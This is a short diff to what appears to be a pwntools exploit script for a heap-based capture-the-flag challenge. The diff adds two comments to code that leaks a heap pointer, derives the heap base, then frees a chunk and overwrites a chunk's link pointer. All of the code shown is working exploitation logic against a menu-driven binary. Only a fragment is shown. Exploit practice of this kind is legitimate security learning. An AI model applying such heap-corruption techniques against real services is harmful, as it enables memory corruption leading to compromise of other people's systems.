@@ -36,6 +36,7 @@ def Free():
 def View():
   s.sendlineafter(">> ", "5")
 
+# heap leak
 Alloc(0x10, "\n")
 View()
 heap_leak = u64(s.recv(6)+b"\x00\x00")
@@ -43,6 +44,7 @@ heap_base = heap_leak - 0x220a
 print("heap_leak =", hex(heap_leak))
 print("heap_base =", hex(heap_base))
 
+# Change address of chunk link
 Alloc(1100, "A"*4)
 Free()
 Write(heap_base+0x20a0, heap_base+0x1ef0)
